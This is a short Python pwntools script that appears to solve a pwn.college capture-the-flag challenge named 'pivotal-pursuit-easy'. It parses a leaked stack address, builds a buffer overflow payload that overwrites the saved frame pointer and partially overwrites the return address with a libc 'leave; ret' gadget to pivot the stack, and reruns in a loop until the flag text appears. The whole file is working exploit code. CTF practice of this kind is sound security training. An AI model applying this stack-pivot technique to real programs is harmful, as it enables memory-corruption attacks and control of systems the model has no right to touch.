#!/usr/bin/python3

import time
from pwn import *
import re

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/pivotal-pursuit-easy')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop_elf = ROP(elf)
rop_libc = ROP(libc)

rbp = 0x7ffd559d6330
input_start = rbp - 0xa0 + 0x8
ret = rbp + 0x8
offset = ret - input_start


leave = rop_libc.find_gadget(["leave","ret"]).address
counter = 0
while 1:
    counter += 1
    print(counter)
    io = process()
    io.recvuntil(b"[LEAK]")
    data = io.recvline()[:-1].decode()
    match = int(re.findall(r"0x[a-f\d]+",data)[0],16)

    payload = b"a" * (offset - 8)
    payload += p64(match - 16)
    payload += leave.to_bytes(3,"little")

    io.send(payload)


    d = io.recvall().decode()
    if "pwn.college" in  d:
        print(d)
        io.close()
        break
    io.close()
